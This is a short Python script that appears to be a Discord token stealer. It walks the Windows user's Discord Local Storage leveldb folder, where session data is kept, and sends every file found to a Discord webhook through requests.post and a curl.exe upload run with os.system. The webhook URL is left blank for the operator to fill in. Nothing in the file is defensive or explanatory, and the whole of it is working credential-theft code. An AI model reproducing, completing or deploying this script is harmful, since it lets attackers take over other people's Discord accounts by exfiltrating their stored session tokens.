import requests
import os

discord_webhook_url = ""

user_name = os.getenv('USERNAME')

def send_data(file_name, discord_webhook_url):
    message = "".join(file_name)
    data = {
        "content": f"DATA DISCORD : \n```{message}```"
    }
    requests.post(discord_webhook_url, json=data)

    curl_command = f'curl.exe -s -o nul -F file1=@"{file_name}" "{discord_webhook_url}"'
    os.system(curl_command)

def traverse_directory(folder_path, discord_webhook_url):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            send_data(file_path, discord_webhook_url)

folder_path = rf"C:\Users\{user_name}\AppData\Roaming\discord\Local Storage\leveldb"  

traverse_directory(folder_path, discord_webhook_url)

files = os.listdir(folder_path)
file_name = []

for file in files:
    if os.path.isfile(os.path.join(folder_path, file)):
        file_name.append(file)
